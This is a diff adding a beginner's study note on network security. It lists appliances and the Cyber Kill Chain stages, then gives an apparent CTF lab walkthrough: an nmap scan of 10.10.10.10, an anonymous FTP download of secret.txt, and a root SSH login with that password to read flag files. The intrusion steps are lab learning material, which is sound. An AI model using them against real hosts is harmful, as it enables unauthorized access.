@@ -1,0 +1,49 @@
+Network Security: hardware and software solutions to achieve the set security goals
+
+Examples of hardware appliances:
+-firewall appliance
+-intrusion detection system
+-intrusion prevention system
+-virtual private network
+
+Examples of software
+-Antivirus software
+-Host firewall: eg. Windows Defender Firewall
+
+Cyber Kill Chain
+1. Recon: gather information
+2. Weaponization: prep file with malicious component
+3. Delivery: deliver malicious component eg. email or flash memory
+4. Exploit: once malicious compnent executes and installs malicious component on target system
+5. command and control: control of target system
+6. Post Exploit: objetives such as data exfiltration executed 
+
+------------------
+
+nmap 10.10.10.10
+
+result: 
+21/tcp FTP
+22/tcp ssh
+80/tcp http
+
+FTP: file transfer protocol
+SSH: secure shell
+HTTP: hypertext transfer protocol
+
+ftp 10.10.10.10
+name: anonymous
+ls
+-secret.txt
+get secret.txt
+
+->new tab
+cat secret.txt
+ssh root@10.10.10.10
+pass: 'secret.txt'
+
+ls
+cat flag.txt
+
+cd /home/librarian
+cat flag.txt
